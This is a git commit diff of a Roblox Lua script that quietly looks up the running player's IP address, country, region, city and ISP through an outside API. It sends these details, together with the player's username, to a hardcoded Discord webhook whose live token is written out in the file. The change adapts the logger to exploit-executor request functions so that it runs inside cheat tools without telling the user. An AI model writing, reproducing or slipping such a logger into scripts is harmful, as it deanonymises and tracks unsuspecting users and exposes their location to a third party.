f5bf251d6194bf98a58d0e7f74976a1bcba87ecf
ug_32 <154809425+ug32-C9@users.noreply.github.com>
2025-07-12 12:29:41 +0800

    Add files via upload

--- Main-Test2.lua
+++ Main-Test2.lua
@@ -1,48 +1,38 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
+
 local api = "https://velonix-ip-api.vercel.app/api/ip"
 local webhook = "https://discord.com/api/webhooks/1393398739812487189/D8MlZ7oGZ70VwMX045sIHBDmWUmBEvtBDDqJe97pJBfaSFZgQA2zRllrJKs-b8GOqXO9"
-local success, response = pcall(function()
-	return HttpService:GetAsync(api)
-end)
 
-if success then
-	local data = HttpService:JSONDecode(response)
+local res = game:HttpGet(api)
+local data = HttpService:JSONDecode(res)
 
-	local player = Players.LocalPlayer
-	local username = player and player.Name or "Unknown"
+local player = Players.LocalPlayer
+local username = player and player.Name or "Unknown"
 
-	local payload = {
-		username = "Logger",
-		embeds = {{
-			title = "📡 User:",
-			description = "**User:** `" .. username .. "`\n"
-				.. "**IP:** `" .. (data.ip or "Unknown") .. "`\n"
-				.. "**Country:** `" .. (data.country or "Unknown") .. "`\n"
-				.. "**Region:** `" .. (data.region or "Unknown") .. "`\n"
-				.. "**City:** `" .. (data.city or "Unknown") .. "`\n"
-				.. "**ISP:** `" .. (data.org or "Unknown") .. "`",
-			color = 3447003,
-			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-		}}
-	}
+local payload = {
+	username = "🔥 | Developer",
+	embeds = {{
+		title = "📡 User:",
+		description = "**User:** `" .. username .. "`\n"
+			.. "**IP:** `" .. (data.ip or "Unknown") .. "`\n"
+			.. "**Country:** `" .. (data.country or "Unknown") .. "`\n"
+			.. "**Region:** `" .. (data.region or "Unknown") .. "`\n"
+			.. "**City:** `" .. (data.city or "Unknown") .. "`\n"
+			.. "**ISP:** `" .. (data.org or "Unknown") .. "`",
+		color = 3447003,
+		timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+	}}
+}
 
-	local jsonPayload = HttpService:JSONEncode(payload)
-	local successWebhook, result = pcall(function()
-		return HttpService:RequestAsync({
-			Url = webhook,
-			Method = "POST",
-			Headers = {
-				["Content-Type"] = "application/json"
-			},
-			Body = jsonPayload
-		})
-	end)
-	if successWebhook and result.Success then
-		print("✅ Script Executed.")
-	else
-		warn("❌ Missing Execution Logic: ", result and result.StatusCode)
-	end
-else
-	warn("❌ Failed to send.")
-end
+local jsonPayload = HttpService:JSONEncode(payload)
+
+local req = (syn and syn.request) or (http and http.request) or request
+local response = req({
+	Url = webhook,
+	Method = "POST",
+	Headers = {
+		["Content-Type"] = "application/json"
+	},
+	Body = jsonPayload
+})
